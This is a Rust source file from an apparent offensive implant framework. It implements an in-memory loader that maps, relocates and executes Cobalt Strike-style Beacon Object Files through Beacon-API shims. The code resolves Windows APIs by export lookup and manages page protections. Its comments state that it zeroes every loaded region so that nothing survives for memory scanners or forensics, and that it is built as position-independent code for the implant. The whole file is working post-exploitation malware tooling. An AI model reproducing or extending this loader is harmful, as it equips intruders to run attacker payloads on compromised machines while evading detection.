//! BOF execution core for the isolated host — parse → W^X map → relocate →
//! flip RX → call `go()`. Ported from `crates/implant-tasks/src/bof.rs` (the
//! inline loader) with the output-capture tail removed: `go()` runs and the
//! shims write to the inherited stdout pipe; errors come back as `Err(&str)`
//! which the entry reports on the pipe + via the exit code.
//!
//! W^X contract is identical to the inline loader: sections are allocated RW,
//! relocated, then code sections flip to `PAGE_EXECUTE_READ` — no page is
//! ever W+X at call time. The [`SectionGuard`] zeroes + frees every region on
//! every exit path, same as bof.rs.

use core::ffi::c_void;
use core::ptr;
use nyx_coff::{apply, parse, SymbolResolver};
use nyx_implant_core::heap::{String, Vec};

// ---- Win32 constants ----

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
/// `MEM_RELEASE` — with this flag `dwSize` must be 0 and `lpAddress` the
/// allocation base.
const MEM_RELEASE: u32 = 0x8000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_SIZE: usize = 0x1000;

/// `IMAGE_SCN_MEM_EXECUTE` — marks a code section (.text).
const SCN_MEM_EXECUTE: u32 = 0x2000_0000;

type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;

unsafe fn virtual_alloc() -> Option<VirtualAllocFn> {
    let a = unsafe { crate::export_addr(b"kernel32.dll", b"VirtualAlloc") }?;
    Some(unsafe { core::mem::transmute::<usize, VirtualAllocFn>(a) })
}
unsafe fn virtual_protect() -> Option<VirtualProtectFn> {
    let a = unsafe { crate::export_addr(b"kernel32.dll", b"VirtualProtect") }?;
    Some(unsafe { core::mem::transmute::<usize, VirtualProtectFn>(a) })
}
unsafe fn virtual_free() -> Option<VirtualFreeFn> {
    let a = unsafe { crate::export_addr(b"kernel32.dll", b"VirtualFree") }?;
    Some(unsafe { core::mem::transmute::<usize, VirtualFreeFn>(a) })
}

fn page(n: usize) -> usize {
    (n + PAGE_SIZE - 1) & !(PAGE_SIZE - 1)
}

// ============================================================================
// Symbol resolver: defined (in-image) symbols first, then Beacon-API externals.
// ============================================================================

struct BofResolver<'a> {
    /// (name, addr) for symbols defined within the mapped BOF sections.
    defined: &'a [(String, u64)],
}

impl SymbolResolver for BofResolver<'_> {
    fn resolve(&self, name: &str) -> Option<u64> {
        // Defined symbols first.
        for (n, addr) in self.defined {
            if n.as_str() == name {
                return Some(*addr);
            }
        }
        // Then the Beacon-API shim table.
        crate::shim::beacon_api_addr(name)
    }
}

/// Allocate `sz` bytes within ±2 GiB of `anchor` so REL32 relocations from the
/// BOF to the shim code (inside this blob) don't overflow. Same downward
/// 1 MiB probe as bof.rs::alloc_near.
///
/// # Safety
/// `alloc` must be the resolved kernel32 VirtualAlloc.
unsafe fn alloc_near(alloc: VirtualAllocFn, anchor: usize, sz: usize) -> *mut c_void {
    const PAGE: usize = 0x1000;
    const STEP: usize = 1 << 20; // 1 MiB probe stride
    const WINDOW: usize = (2u64 << 30) as usize; // 2 GiB REL32 reach
    let mut hint = (anchor & !(PAGE - 1)).saturating_sub(STEP);
    let floor = anchor.saturating_sub(WINDOW);
    let mut tries = 0;
    while hint > floor && tries < 64 {
        let p = unsafe {
            alloc(
                hint as *mut c_void,
                sz,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if !p.is_null() {
            return p;
        }
        hint = hint.saturating_sub(STEP);
        tries += 1;
    }
    // Fall back to the kernel's choice (REL32 may overflow, but at least we
    // return a region rather than failing outright).
    unsafe {
        alloc(
            ptr::null_mut(),
            sz,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    }
}

// ============================================================================
// RAII guard: zero + free every VirtualAlloc'd section region on every exit
// path (see bof.rs::SectionGuard for the full leak/forensics rationale).
// ============================================================================

/// One mapped BOF section: base, page-rounded size, and whether it was
/// flipped RX (so Drop flips it back to RW before zeroing).
#[derive(Clone, Copy)]
struct SectionAlloc {
    base: u64,
    size: usize,
    is_rx: bool,
}

/// RAII owner of the section regions. On drop: flip RX→RW if needed, zero,
/// then VirtualFree(MEM_RELEASE). Best-effort on any failure (no diag_mark
/// here — the host writes loader errors to the pipe, and a cleanup failure
/// after `go()` returned is not loader-visible).
struct SectionGuard {
    sections: Vec<SectionAlloc>,
    free: VirtualFreeFn,
    protect: VirtualProtectFn,
}

impl Drop for SectionGuard {
    fn drop(&mut self) {
        for s in &self.sections {
            if s.base == 0 {
                continue;
            }
            unsafe {
                let p = s.base as *mut c_void;
                // RX sections were flipped to PAGE_EXECUTE_READ — writing them
                // now would fault, so flip back to RW first.
                if s.is_rx {
                    let mut old: u32 = 0;
                    if (self.protect)(p, s.size, PAGE_READWRITE, &mut old) != 0 {
                        zero_region(p, s.size);
                    }
                } else {
                    zero_region(p, s.size);
                }
                // MEM_RELEASE: dwSize MUST be 0, lpAddress the alloc base.
                let _ = (self.free)(p, 0, MEM_RELEASE);
            }
        }
    }
}

/// Fill a region with zeros (RtlZeroMemory when resolvable, else a hand-rolled
/// loop) — no relocated BOF bytes survive for a memory scanner.
unsafe fn zero_region(p: *mut c_void, len: usize) {
    if let Some(addr) = unsafe { crate::export_addr(b"kernel32.dll", b"RtlZeroMemory") } {
        type RtlZero = unsafe extern "system" fn(*mut c_void, usize);
        let f: RtlZero = unsafe { core::mem::transmute(addr) };
        unsafe { f(p, len) };
        return;
    }
    unsafe { ptr::write_bytes(p as *mut u8, 0, len) };
}

// ============================================================================
// Loader: parse → W^X map → reloc → resolve entry → call.
// ============================================================================

/// Load + relocate the COFF `blob` into W^X memory, then call its `go()`
/// entry with `(args_ptr, args_len)`. The shims write BOF output to the
/// inherited stdout pipe; this returns only the loader status.
pub unsafe fn run(blob: &[u8], args_ptr: *const u8, args_len: i32) -> Result<(), String> {
    let coff = match parse(blob) {
        Ok(c) => c,
        Err(e) => {
            let mut m = String::from("bof parse: ");
            m.push_str(match e {
                nyx_coff::CoffError::Truncated => "truncated",
                nyx_coff::CoffError::UnsupportedMachine(_) => "bad machine",
            });
            return Err(m);
        }
    };

    // Resolve VirtualAlloc/VirtualProtect/VirtualFree up front; the guard is
    // built before any allocation so every region pushed so far is freed on
    // a later failure.
    let alloc =
        unsafe { virtual_alloc() }.ok_or_else(|| String::from("VirtualAlloc unresolved"))?;
    let protect =
        unsafe { virtual_protect() }.ok_or_else(|| String::from("VirtualProtect unresolved"))?;
    let free = unsafe { virtual_free() }.ok_or_else(|| String::from("VirtualFree unresolved"))?;
    let mut guard = SectionGuard {
        sections: Vec::with_capacity(coff.sections.len()),
        free,
        protect,
    };

    // Anchor near the shim code (inside this blob) so REL32 calls from BOF
    // .text to the Beacon-API shims span < 2 GiB (see bof.rs::run_anchor).
    // The fn-item address equals beacon_api_addr("BeaconPrintf") and avoids
    // a name-string constant (LLVM may sink such constants into .text
    // dead regions, tripping the PIC dumper's reachability gate).
    let anchor = crate::shim::BeaconPrintf as *const () as usize;

    // 1. Allocate each section as its own RW region; copy raw bytes.
    let mut bases: Vec<u64> = Vec::with_capacity(coff.sections.len());
    let mut sizes: Vec<usize> = Vec::with_capacity(coff.sections.len());
    let mut is_code: Vec<bool> = Vec::with_capacity(coff.sections.len());
    for s in &coff.sections {
        let sz = page((s.virtual_size.max(s.raw.len() as u32)) as usize).max(PAGE_SIZE);
        let base = unsafe { alloc_near(alloc, anchor, sz) };
        if base.is_null() {
            return Err(String::from("VirtualAlloc failed"));
        }
        let addr = base as u64;
        if !s.raw.is_empty() {
            unsafe {
                ptr::copy_nonoverlapping(s.raw.as_ptr(), addr as *mut u8, s.raw.len());
            }
        }
        bases.push(addr);
        sizes.push(sz);
        is_code.push(s.characteristics & SCN_MEM_EXECUTE != 0);
        guard.sections.push(SectionAlloc {
            base: addr,
            size: sz,
            is_rx: false,
        });
    }

    // 2. Map defined symbols → absolute addresses (section_base + value).
    let mut defined: Vec<(String, u64)> = Vec::with_capacity(coff.symbols.len());
    for sym in &coff.symbols {
        if sym.section_number >= 1 && (sym.section_number as usize) <= bases.len() {
            let addr = bases[(sym.section_number - 1) as usize] + sym.value as u64;
            defined.push((sym.name.clone(), addr));
        }
    }

    // 3. Apply relocations (memory is still RW here).
    let resolver = BofResolver { defined: &defined };
    for (i, s) in coff.sections.iter().enumerate() {
        if s.relocations.is_empty() {
            continue;
        }
        let patched = match apply(s, &coff, bases[i], &resolver) {
            Ok(p) => p,
            Err(e) => {
                let mut m = String::from("bof reloc `");
                m.push_str(&s.name);
                m.push_str("`: ");
                m.push_str(match e {
                    // black_box: keep each arm's string as an independent
                    // RIP-relative .rdata reference. Without it LLVM lowers
                    // the match to a static pointer table (absolute
                    // addresses), which the PIC dumper rejects.
                    nyx_coff::ApplyError::BadSymbolIndex(_) => {
                        core::hint::black_box("bad symbol index")
                    }
                    nyx_coff::ApplyError::Unresolved(_) => {
                        core::hint::black_box("unresolved external")
                    }
                    nyx_coff::ApplyError::BadOffset => core::hint::black_box("bad offset"),
                    nyx_coff::ApplyError::UnsupportedReloc(_) => {
                        core::hint::black_box("unsupported reloc type")
                    }
                    nyx_coff::ApplyError::RelocOverflow => {
                        core::hint::black_box("reloc displacement out of i32 range")
                    }
                });
                return Err(m);
            }
        };
        unsafe {
            ptr::copy_nonoverlapping(patched.as_ptr(), bases[i] as *mut u8, patched.len());
        }
    }

    // 4. Flip code sections to RX (W^X: close the write window).
    for i in 0..bases.len() {
        if is_code[i] {
            let mut old: u32 = 0;
            if unsafe {
                protect(
                    bases[i] as *mut c_void,
                    sizes[i],
                    PAGE_EXECUTE_READ,
                    &mut old,
                )
            } == 0
            {
                return Err(String::from("VirtualProtect -> RX failed"));
            }
            guard.sections[i].is_rx = true;
        }
    }

    // 5. Resolve the entry symbol `go`.
    let entry_sym = coff
        .symbols
        .iter()
        .find(|s| s.name == "go")
        .ok_or_else(|| String::from("BOF entry symbol `go` not found"))?;
    if entry_sym.section_number < 1 {
        return Err(String::from("BOF entry `go` is external/undefined"));
    }
    // `section_number` is raw COFF data; reject an out-of-range section
    // instead of indexing `bases` out of bounds (same guard as bof.rs).
    if entry_sym.section_number as usize > bases.len() {
        return Err(String::from("BOF entry `go` section out of range"));
    }
    let entry_addr = bases[(entry_sym.section_number - 1) as usize] + entry_sym.value as u64;

    // 6. Call go(args, alen) — CS ABI: `void go(char* args, int alen)`. A
    //    no-args BOF gets a NULL buffer (BeaconDataParse(NULL, 0) fallback)
    //    instead of a dangling empty-slice pointer. The SectionGuard drops
    //    after go() returns, zeroing + freeing every region.
    unsafe {
        let go: extern "C" fn(*const u8, i32) = core::mem::transmute(entry_addr);
        if args_len <= 0 || args_ptr.is_null() {
            go(core::ptr::null(), 0);
        } else {
            go(args_ptr, args_len);
        }
    }
    drop(guard);
    Ok(())
}
